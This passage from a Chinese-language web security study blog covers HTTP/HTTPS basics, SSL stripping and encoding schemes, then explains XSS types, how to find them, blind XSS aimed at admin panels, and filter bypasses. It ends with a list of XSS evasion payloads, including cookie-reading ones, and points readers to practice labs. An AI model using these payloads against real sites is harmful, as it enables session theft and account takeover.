<p>其响应正文内容呢，一般携带当前页面源码，在安全方面无需关注。</p>
<p>常见状态代码及状态描述：</p>
<blockquote>
<p>·200：OK，客户端请求成功。</p>
<p>·301：Permanently Moved，页面重定向。</p>
<p>·203：Temporarily Moved，页面临时重定向。</p>
<p>·400：Bad Request，客户端请求有语法错误，不能被服务器所理解。</p>
<p>·401：Unauthorized，请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。</p>
<p>·403：Forbidden，服务器收到请求，但是拒绝提供服务。</p>
<p>·404：Not Found，请求资源不存在，或者请求无法实现。</p>
<p>·500：Internal Server Error，服务器发生不可预期的错误。</p>
<p>·503：Server Unavailable，服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</p>
</blockquote>
<h3 id="4-URL"><a href="#4-URL" class="headerlink" title="4.URL"></a>4.URL</h3><p>协议+IP+端口(80省略呗)+路径+参数</p>
<blockquote>
<p><a href="https://www.neat-reader.cn/webapp#/epubreader?bookguid=682">https://www.neat-reader.cn/webapp#/epubreader?bookguid=682</a></p>
</blockquote>
<h2 id="3-HTTPS协议"><a href="#3-HTTPS协议" class="headerlink" title="3.HTTPS协议"></a>3.HTTPS协议</h2><p>HTTP的话，在登录页面上提交账户密码，用wireshark抓取该行为，可以清晰地看到用户当前的行为，包括用户的登录情况、用户名和密码、访问地址等。</p>
<p>所以引出HTTPS</p>
<h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>HTTPS并不是一个独立的协议，而是工作在SSL协议上的HTTP协议。SSL（Secure Sockets Layer，安全套接层）是一种为网络通信提供安全及数据完整性的安全协议。当然后续有TLS了，算是对SSL的拓展。</p>
<p>在HTTPS传输过程中有两个核心的问题将直接影响用户的数据安全：</p>
<p>1）如何建立安全的传输通道：加密方式</p>
<p>2）如何确认双方的身份：CA认证中心的权威</p>
<h3 id="2-HTTPS单向认证"><a href="#2-HTTPS单向认证" class="headerlink" title="2.HTTPS单向认证"></a>2.HTTPS单向认证</h3><blockquote>
<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。</p>
<p>3）从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
<p>4）服务器端用其私钥解密出数据，即得到客户端发送来的对称密钥，之后均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
</blockquote>
<p>单向认证的特点在于只有客户端对服务器端进行了身份验证，而服务器只是对提交过来的加密密钥进行识别并处理，而不对客户端的合法性进行验证。这就造成了遭受SSL剥离攻击的隐患。</p>
<h4 id="SSL剥离攻击"><a href="#SSL剥离攻击" class="headerlink" title="SSL剥离攻击"></a>SSL剥离攻击</h4><p>SSL剥离攻击是针对HTTPS单向认证环境的攻击手段。例如，SSL Strip工具的原理就是劫持用户的请求，并模拟用户来与目标站点建立HTTPS连接。成功连接后利用已建立连接的对称密钥解密服务器发送过来的HTTPS，将其中的HTTP再发送给客户端</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616221327435.png" alt="SSL剥离攻击流程"></p>
<p>故HTTPS重点是解决传输过程中链路被劫持的风险，针对Web系统的安全防护效果有限。</p>
<h3 id="3-HTTPS双向认证"><a href="#3-HTTPS双向认证" class="headerlink" title="3.HTTPS双向认证"></a>3.HTTPS双向认证</h3><blockquote>
<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。在这里新增了两个步骤：</p>
<p>①服务器端要求客户端发送证书并验证，并接受用户的公钥。</p>
<p>②双方利用对方公钥加密来协商可支持的传输类型及密码方案。</p>
<p>3）客户端从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
<p>4）服务器端用私钥解密出数据，即得到客户端发送来的对称密钥，之后所有内容均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
</blockquote>
<p>该认证方式增加了服务器对客户端的合法性校验，这样可有效避免SSL剥离攻击。但由于会要求密钥生成(安装密钥生成插件)，需要让用户有额外操作，不适用于全部场景。</p>
<h3 id="4-HTTPS特点"><a href="#4-HTTPS特点" class="headerlink" title="4.HTTPS特点"></a>4.HTTPS特点</h3><p>·HTTPS并没有改变HTTP协议本身的特性，只是在传输过程中利用SSL&#x2F;TLS技术进行加密，保障传输过程中的安全。</p>
<p>·HTTPS技术可有效保障用户信息不被泄露，避免上网行为设备、代理类设备对用户当前行为的获取，并且可有效避免来自运营商层面的TCP劫持。</p>
<p>·HTTPS主要防护传输过程中的安全，如果在用户端利用Burpsuite，则依然可以通过代理技术实现对Web访问的劫持，因此并不会有效提升服务器的安全性。</p>
<p>HTTPS重点解决的是<strong>传输过程</strong>中的安全问题，可用来保障客户端的传输数据安全，并不会直接提升Web站点的安全性。Web安全的问题仍要从功能角度出发，找到问题根源，方可有效解决。</p>
<h2 id="4-编码加密"><a href="#4-编码加密" class="headerlink" title="4.编码加密"></a>4.编码加密</h2><p><strong>针对字符的编码</strong></p>
<blockquote>
<p>1.ASCII编码</p>
<p>2.DBCS（Double Byte Charecter Set，双字节字符集）:</p>
<p>GB2312、GBK和GB18030等中文编码</p>
</blockquote>
<p><strong>传输过程的编码</strong></p>
<p>一般在HTML中，利用“&#x2F;”“？”“&amp;”等符号实现针对特定字符的内容定义。如果url的参数中也有这些字符，需要编码避免产生影响</p>
<h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1.URL编码"></a>1.URL编码</h3><blockquote>
<p>URL中只允许包含英文字母（a～z、A～Z）、数字（0～9）、4个特殊字符（-、_、.、~）以及所有保留字符。在实际Web应用中，所使用的字符不只在这个范围内，如用户输入参数中还带有单引号、百分号、中文等。因此，需要对URL中的非允许字符进行编码。</p>
<p>主体采用的是ASCII编码表，编码方式是用%（百分号）加上两位字符代表一个字节。</p>
<p>例如，单引号在ASCII中的<strong>十六进制</strong>编码为27，在URL编码中就是%27。</p>
<p>对于中文字符，会先确认当前页面所用的编码格式。如果当前页面使用UTF-8编码，则会先将中文字符转换成UTF-8编码，然后在每个字符的每一组编码前添加%，这样就完成URL编码。</p>
</blockquote>
<p>例如：</p>
<blockquote>
<p>·URL编码前</p>
<p><a href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=测试&amp;passwd=ww121%$</a></p>
<p>·URL编码后</p>
<p><a href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&amp;passwd=ww121%25$</a></p>
</blockquote>
<p>假设当前页面为UTF-8编码。可以看到，URL编码里针对参数“ww121%$”中的“%”进行了编码，编码结果为“%25”。针对中文字符“测试”，URL编码(<strong>十六进制</strong>)为“%E6%B5%8B%E8%AF%95”。再查询“测试”字符的UTF-8编码，其十六进制编码就是“E6B58B E8AF95”。</p>
<h3 id="2-base64编码"><a href="#2-base64编码" class="headerlink" title="2.base64编码"></a>2.base64编码</h3><p>其原理是将3个8bit字节（3<em>8&#x3D;24）转化为4个6bit的字节（4</em>6&#x3D;24）。因此，Base64编码的特点是编码后的字节数<strong>是4的倍数</strong>，如果不足4bit则用等号（&#x3D;）等进行填充。<strong>它含有大小写字母及+、-、&#x3D;等符号</strong>。</p>
<p>例如：</p>
<blockquote>
<p>·编码前：base64编码</p>
<p>·编码后：YmFzZTY057yW56CB（十六位）</p>
<p>·编码前：base64编码1测试</p>
<p>·编码后：YmFzZTY057yW56CBMea1i+ivlQ&#x3D;&#x3D;</p>
</blockquote>
<h3 id="3-HTML字符实体"><a href="#3-HTML字符实体" class="headerlink" title="3.HTML字符实体"></a>3.HTML字符实体</h3><p>表示HTML中危险字符的方案，也是解决跨站脚本（XSS）攻击的有效手段。</p>
<p>HTML字符实体的特点是以&amp;开头，并以分号结尾。例如，“&lt;”的编码是“&amp;lt；”。</p>
<p>比如防范xss攻击时，</p>
<p>xss语句:<code>&lt;script&gt;alert（/xss/）&lt;/script&gt;</code></p>
<p>当用户提交的参数为xss语句时，经过HTML字符实体处理后，可得到“&amp;lt；script&amp;gt；alert（&#x2F;xss&#x2F;）&amp;lt；&#x2F;script&amp;gt；”。这样就解决了危险字符的显示问题。</p>
<h3 id="4-Web系统中的加密措施"><a href="#4-Web系统中的加密措施" class="headerlink" title="4.Web系统中的加密措施"></a>4.Web系统中的加密措施</h3><p>标准的加密方法是对用户提交的参数（如密码、特定内容等）进行加<strong>密后再传输</strong>，避免参数在传输过程中被劫持，导致用户数据丢失。当数据传输到Web服务器，将参数解密后处理。这个过程中存在两种情况。</p>
<h4 id="1-不需要服务器知道明文的内容"><a href="#1-不需要服务器知道明文的内容" class="headerlink" title="1.不需要服务器知道明文的内容"></a>1.不需要服务器知道明文的内容</h4><p>常见于用户的隐私信息，如用户密码。Web系统在存储用户密码时不会直接存储密码明文，而是预先设定加密算法，将用户的隐私信息加密后存储在数据库中。这样可在系统运维过程中避免管理人员直接观察并获取用户的密码信息。这种情况下，经常利用MD5&#x2F;SHA-1实现加密。</p>
<blockquote>
<p>MD5&#x2F;SHA-1是一种信息摘要算法，可将任意长度的明文内容转换成长度固定的密文，并且针对信息摘要的过程不可逆，但针对相同内容每次执行算法得到的密文完全相同。</p>
</blockquote>
<p>Web系统存储的内容就是经过MD5&#x2F;SHA-1转换后的密文。因此用户在客户端利用MD5&#x2F;SHA-1将转换后的密文传输到Web系统，Web系统再将<strong>用户密文与数据库中的密文进行比对</strong>即可。</p>
<p>当然，由于大量彩虹表（存储明文与密文的表）存在，可间接实现密码破解的效果。</p>
<p>此外，MD5&#x2F;SHA-1存在碰撞问题，即存在<strong>不同明文</strong>利用MD5或SHA-1计算之后得到的<strong>密文完全相同</strong>。</p>
<h4 id="2-需要服务器知道明文的内容"><a href="#2-需要服务器知道明文的内容" class="headerlink" title="2.需要服务器知道明文的内容"></a>2.需要服务器知道明文的内容</h4><p>客户端发起的请求中包含了大量需要服务器处理的内容，如订单信息、留言等。由于HTTP协议在传输过程中并不会对其中的内容加密，就会导致在传输过程中内容被抓包。</p>
<p>在传输过程中，加密的最大意义还是避免内容泄漏。</p>
<p>由于成本问题，https不是免费的哈，多数大型站点仍然会采用HTTP进行业务开展。</p>
<p>要在HTTP下保障传输安全，可利用对称加密措施进行实现，如AES方式等。但Web站点始终在用户浏览器上，那么相对应的加密算法也处于公开状态，所以<strong>算法越复杂越好</strong>，此外还要<strong>降低加密传参的数量</strong></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>http请求&#x2F;响应包结构、http与https、编码加密</p>
<h1 id="二、网络攻击"><a href="#二、网络攻击" class="headerlink" title="二、网络攻击"></a>二、网络攻击</h1><p>基础攻击是攻击者将攻击代码通过各种方式<strong>嵌入到现有Web系统中</strong>，造成Web系统在执行的时候，嵌入的攻击代码使Web系统原有功能结构发生改变，进而导致安全漏洞的出现。</p>
<h2 id="1-xss攻击"><a href="#1-xss攻击" class="headerlink" title="1.xss攻击"></a>1.xss攻击</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>XSS攻击（Cross Site Scripting，跨站脚本攻击），也叫做html&#x2F;js注入攻击。</p>
<blockquote>
<p>是指攻击者利用网站程序对用户输入过滤不足的缺陷，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
</blockquote>
<blockquote>
<p>XSS攻击主要影响的是用户端的安全，包含用户信息安全、权限安全等。并且多数XSS攻击都依赖于JavaScript脚本开展。</p>
</blockquote>
<h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><blockquote>
<p>将恶意脚本嵌入到当前网页中并执行的攻击方式</p>
</blockquote>
<h3 id="3-原因"><a href="#3-原因" class="headerlink" title="3.原因"></a>3.原因</h3><blockquote>
<p>主要原因是网站对于用户提交的数据过滤不严格，导致用户提交的数据可以修改当前页面或者插入了一段脚本。</p>
<p>网站一般具有用户输入参数功能，如网站留言板、评论处等。攻击者利用其用户身份在输入参数时附带了恶意脚本，在提交服务器之后，服务器没有对用户端传入的参数做任何安全过滤。之后服务器会根据业务流程，将恶意脚本存储在数据库中或直接回显给用户。在用户浏览含有恶意脚本的页面时，恶意脚本会在用户浏览器上成功执行。恶意脚本有很多种表现形式，如常见的弹窗、窃取用户Cookie、弹出广告等，这也是跨站攻击的直接效果。</p>
</blockquote>
<h3 id="4-涉及风险功能点"><a href="#4-涉及风险功能点" class="headerlink" title="4.涉及风险功能点"></a>4.涉及风险功能点</h3><h5 id="1-评论"><a href="#1-评论" class="headerlink" title="1.评论"></a>1.评论</h5><p>用户输入评论（评论处为攻击代码）→服务器接收到评论并存储（入库存储）→前台自动调用评论→任何人触发评论（直接看到攻击代码）→攻击成功</p>
<h5 id="2-私信"><a href="#2-私信" class="headerlink" title="2.私信"></a>2.私信</h5><p>用户发送私信（私信内夹带攻击代码）→服务器接收私信并存储（入库处理）→收信用户打开私信（展示攻击代码）→攻击成功。</p>
<p>XSS攻击的目标为<strong>打开已经嵌入XSS攻击代码网页的用户</strong>。用户的身份类型各不相同。根据身份特点，重点需要保障的用户信息为：</p>
<p>1）网站的管理员账号信息。</p>
<p>2）网站用户的账号信息及特权、金额等。</p>
<p>3）活跃账号的信息。</p>
<h3 id="5-XSS攻击分类"><a href="#5-XSS攻击分类" class="headerlink" title="5.XSS攻击分类"></a>5.XSS攻击分类</h3><p>根据攻击代码的存在地点及是否被服务器存储，并且根据XSS攻击存在的形式及产生的效果，可以将其分为以下三类。</p>
<blockquote>
<p>1）反射型跨站攻击：涉及浏览器—服务器交互。</p>
<p>将用户输入的数据通过URL的形式直接或未经过完善的安全过滤就在浏览器中进行输出，会导致输出的数据中存在可被浏览器执行的代码数据。</p>
<p>因为一般出现在URL中，因此黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使攻击成功实施。</p>
</blockquote>
<blockquote>
<p>2）存储型跨站攻击：涉及浏览器—服务器—数据库交互；</p>
<p>指Web应用程序将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示。</p>
<p>危害最广；实现偷取用户Cookie、进行内网探测、弹出广告等行为。</p>
<p>为常见的场景就是在博客或新闻发布系统中，黑客将包含恶意代码的数据信息直接写入文章或文章评论中，所有浏览文章或评论的用户就会被黑客在他们的客户端浏览器环境中执行插入的恶意代码。</p>
</blockquote>
<blockquote>
<p>3）DOM型跨站攻击：涉及浏览器—服务器交互。</p>
<p>其从效果上来说也算是反射型XSS。但是这种XSS实现方法比较特殊，是由<strong>JavaScript的DOM节点编程</strong>可以改变HTML代码这个特性而形成的XSS攻击。</p>
<p>基于DOM的XSS攻击往往需要针对具体的JavaScript DOM代码进行分析，并根据实际情况进行XSS攻击的利用。</p>
<p>实际上构造难度较大，比较少见。</p>
</blockquote>
<p>一般例子就是</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621141439046.png"></p>
<p>“write”按钮的onclick事件调用了test（）函数。<strong>而在test（）函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当做HTML写入到页面中</strong>，这就造成了DOM based XSS。</p>
<h3 id="6-攻击条件"><a href="#6-攻击条件" class="headerlink" title="6.攻击条件"></a>6.攻击条件</h3><p>反射型&#x2F;DOM型跨站攻击均可以理解为：</p>
<p>服务器接收到数据，并原样返回给用户，整个过程中Web应用并没有自身的存储过程（存入数据库）。这也就导致了攻击无法持久化，仅针对当次请求有效，也就无法直接攻击其他用户。</p>
<p>当然，这两类攻击也可利用钓鱼、垃圾邮件等手段产生攻击其他用户的效果。但是需在社会工程学的配合下执行。随着目前浏览器的各类过滤措施愈发严格，在实战过程中这类攻击的成功率、效果及危害程度均不高。但我们仍需关注这类风险。</p>
<h4 id="例子（存储型）"><a href="#例子（存储型）" class="headerlink" title="例子（存储型）"></a><strong>例子（存储型）</strong></h4><p>假设攻击者要想成功实施跨站脚本攻击，那么必须对业务流程进行了解。</p>
<p>流程如下：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616232445592.png" alt="业务流程"></p>
<p>业务流程关键点分析：</p>
<p>1）入库处理：攻击脚本需存储在数据库中，可供当前应用的使用者读取。</p>
<p>2）出库处理：由当前功能的使用者按照正常的业务流程从数据库中读取信息，这时攻击脚本即开始执行。</p>
<p>再对攻击进行分析，并结合XSS攻击的特性可知，XSS攻击成功必须要满足<strong>以下四个条件：</strong></p>
<blockquote>
<p>（1）入库处理</p>
<p>1）目标网页有攻击者可控的输入点。</p>
<p>2）输入信息可以在受害者的浏览器中显示。</p>
<p>3）输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过。</p>
<p>（2）出库处理</p>
<p>浏览器将输入解析为脚本，并具备执行该脚本的能力。</p>
</blockquote>
<p>实现一个XSS存储型跨站攻击，以上四点缺一不可。</p>
<p><strong>当然，防护的话，只需破坏上述任意一个条件。</strong></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>从防护角度，可以选择<strong>禁止攻击脚本存储</strong>在数据库，即在入库时做处理；或者对攻击脚本进行<strong>转义</strong>，避免出库时顺利执行。满足以上两种条件中的任何一个即可实现有效的防护。</p>
<h3 id="7-XSS漏洞发现"><a href="#7-XSS漏洞发现" class="headerlink" title="7.XSS漏洞发现"></a>7.XSS漏洞发现</h3><h4 id="1-基本测试流程"><a href="#1-基本测试流程" class="headerlink" title="1.基本测试流程"></a>1.基本测试流程</h4><p>对于存储型跨站漏洞。这主要取决于可能含有XSS漏洞的业务流程针对用户参数的<strong>过滤程度</strong>或者当前的<strong>防护手段</strong>。由于XSS漏洞最终<strong>仍需业务使用者浏览</strong>后方可触发执行，导致某些后台场景<strong>需要管理员触发</strong>后方可发现。因此，漏洞是否存在且可被利用，很多时候需要较长的时间才会得到结果。</p>
<p>常见的web漏洞扫描器可以扫出反射型xss漏洞，但仍有误报的可能，需要人工检验。存储型跨站攻击必须由用户触发才能被发现。如果用户一直不触发，则漏洞无法检查出来。</p>
<p>漏洞标准挖掘流程：</p>
<blockquote>
<p>1）漏洞挖掘，寻找输入点。</p>
<p>2）寻找输出点。</p>
<p>3）确定测试数据输出位置。</p>
<p>4）输入简单的跨站代码进行测试。</p>
</blockquote>
<h5 id="存储型xss测试"><a href="#存储型xss测试" class="headerlink" title="存储型xss测试"></a>存储型xss测试</h5><h6 id="1-寻找输入点"><a href="#1-寻找输入点" class="headerlink" title="1.寻找输入点"></a>1.寻找输入点</h6><p>攻击者通过提交参数，意图修改当前页面的HTML结构。XSS攻击成功时，提交的参数格式可在当前页面拼接成可执行的脚本。</p>
<p>可见，XSS漏洞存在的要求就是：当前页面存在参数显示点，且参数显示点可被用户控制输入。因此，<strong>寻找用户端可控的输入点</strong>是XSS攻击成功的第一步。</p>
<blockquote>
<p>一般发生在留言板、在线信箱、评论栏等处，表现特征是用户可自行输入数据，并且数据会提交给服务器。通常可以通过观察页面的交互行为来确定输入点。通常情况下，要求可提交数据量至少在20字符以上，否则JavaScript脚本很难执行。在日常应用中，如留言板、在线信箱、评论栏等功能都允许用户输入100字左右，均能达到XSS攻击对允许输入字符的要求。</p>
</blockquote>
<p><strong>输入点位置</strong></p>
<blockquote>
<p>除了直接观察之外，利用Web代理工具抓包来查看提交参数也是寻找输入点的一个有效途径。在一些输入点隐蔽或者用户输入被JS脚本限制的页面，可以采用Brupsuite抓包的方式寻找输入点。通过直接抓取HTTP包，观察里面是否有隐藏参数，并且对隐藏参数在页面上进行定位，即可找到输入点位置。</p>
</blockquote>
<h6 id="2-测试输出位置"><a href="#2-测试输出位置" class="headerlink" title="2.测试输出位置"></a>2.测试输出位置</h6><p>测试主要基于两个目的：</p>
<p>1）确定网站对输入内容是否进行了输出，判断是否可以展开XSS攻击。</p>
<p>2）有时候需要根据输出的位置的HTML环境来编写有效的XSS代码。</p>
<p>一般留言板这些，输出位置很明显。</p>
<h6 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h6><p>如<strong>果不回显</strong>的话（内容可能不会在前台展示，或者需要一定的时间通过人工审核后才能展示）</p>
<p>除了凭借经验外，还可以尝试XSS攻击窃取Cookie，后台审核的一般是管理账户，若测试成功可能直接获得管理权限，但直接对管理员实施的XSS攻击也增加了<strong>被发现</strong>的风险。这也就是俗称的“<strong>XSS盲打后台</strong>”。</p>
<p>XSS盲打的目标功能点通常有：</p>
<blockquote>
<p>·留言板</p>
<p>·意见反馈点</p>
<p>·私信功能</p>
<p>·文件上传点中的信息输入框</p>
<p>·在线提交信息等</p>
</blockquote>
<p>XSS盲打的目标是找到输入点插入跨站代码，并且要求插入的代码由管理员在正常Web应用流程中触发。因此，<strong>如何寻找与管理员的“互动”成为关键点。</strong></p>
<p>该漏洞见pikachu靶场。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617002032118.png" alt="管理员登录后台查看留言板"></p>
<h6 id="3-测试基本跨站代码"><a href="#3-测试基本跨站代码" class="headerlink" title="3.测试基本跨站代码"></a>3.测试基本跨站代码</h6><p>测试XSS攻击的经典方式就是“弹窗测试”，即在输入中插入一段可以产生弹窗效果的JavaScript脚本，如果刷新页面产生了弹窗，表明XSS攻击测试成功。</p>
<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，提交后，刷新页面，出现弹窗说明存在xss。</p>
<h4 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2.绕过思路"></a>2.绕过思路</h4><p>以下只提供理论，实践请配合xss-labs靶场使用。</p>
<h5 id="1-闭合标签测试"><a href="#1-闭合标签测试" class="headerlink" title="1.闭合标签测试"></a>1.闭合标签测试</h5><p>利用查看网页源代码功能，如果内容输出在标签内。采取闭合方法。</p>
<h5 id="2-大小写混合测试"><a href="#2-大小写混合测试" class="headerlink" title="2.大小写混合测试"></a>2.大小写混合测试</h5><h5 id="3-多重嵌套测试"><a href="#3-多重嵌套测试" class="headerlink" title="3.多重嵌套测试"></a>3.多重嵌套测试</h5><p>顾名思义，如果&lt;script&gt;标签被自动删除，构造攻击代码为&lt;scr&lt;script&gt;ipt&gt;试试。</p>
<h5 id="4-宽字节绕过测试"><a href="#4-宽字节绕过测试" class="headerlink" title="4.宽字节绕过测试"></a>4.宽字节绕过测试</h5><p>如果目标服务器采取了黑名单+强制转换格式+多重嵌套过滤手段，那么仅通过对脚本中的关键词做基本变形已无法绕过防护机制。</p>
<p>后续的有效思路在于尝试提交的关键词绝对不能与黑名单中的关键词重合，也就是说，<strong>提交的参数应避免触发黑名单机制</strong>。这里会利用宽字节的测试手段。</p>
<h6 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h6><blockquote>
<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等都是常用的宽字节编码，这类编码方案在针对字符进行编码时利用两字节进行编码。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象</p>
</blockquote>
<h6 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h6><blockquote>
<p>GBK编码存在宽字节的问题，主要表现为GBK编码第一字节（高字节）的范围是0x81～0xFE，第二字节（低字节）的范围是0x40～0x7E与0x80～0xFE。GBK就是以这样的十六进制来针对字符进行编码。在GBK编码中，“\”符号的十六进制表示为0x5C，正好在GBK的低字节中。</p>
<p>如果在后面添加一个高字节编码，那么添加的高字节编码会与原有编码组合成一个合法字符。</p>
</blockquote>
<p>你要闭合，发现，引号等参数被转义了。</p>
<p>比如<code>&#39;;sdsdsd&#39;</code>结果为<strong>\‘;.</strong>..</p>
<p>而宽字节绕过为：</p>
<p><code>%bf&#39;;&lt;script&gt;alert(/xss/)&lt;/script&gt;;//</code></p>
<p>分析一下：</p>
<p>%bf在GBK编码的高字节范围，与后台转义单引号（’）生成的斜杠（\）相结合，正好组成了汉字“縗”的GBK编码，这个时候斜杠对单引号的转义效果便失效了，当然了，现在一般都采用utf-8，这种漏洞环境就少见了。</p>
<h5 id="5-多标签测试"><a href="#5-多标签测试" class="headerlink" title="5.多标签测试"></a>5.多标签测试</h5><p>能够触发弹窗效果的远不止&lt;script&gt;这一种标签</p>
<p>各类语法如下：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&quot;&gt;&lt;iframe src=http://XXX.XXX&gt;</span><br><span class="line">&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))</span><br><span class="line">&gt;//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//</span><br><span class="line">&gt;--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#x27;XSS&#x27;&quot;)`&gt;</span><br><span class="line">&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav??? ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&gt;&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\</span><br><span class="line">&gt;0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029&#x27;\</span><br><span class="line">&gt;0029&quot;&gt;</span><br><span class="line">&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&gt;%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&gt;&#x27;; alert(document.cookie); var foo=&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>语句失效是难免的，主要是了解构造原理。</p>
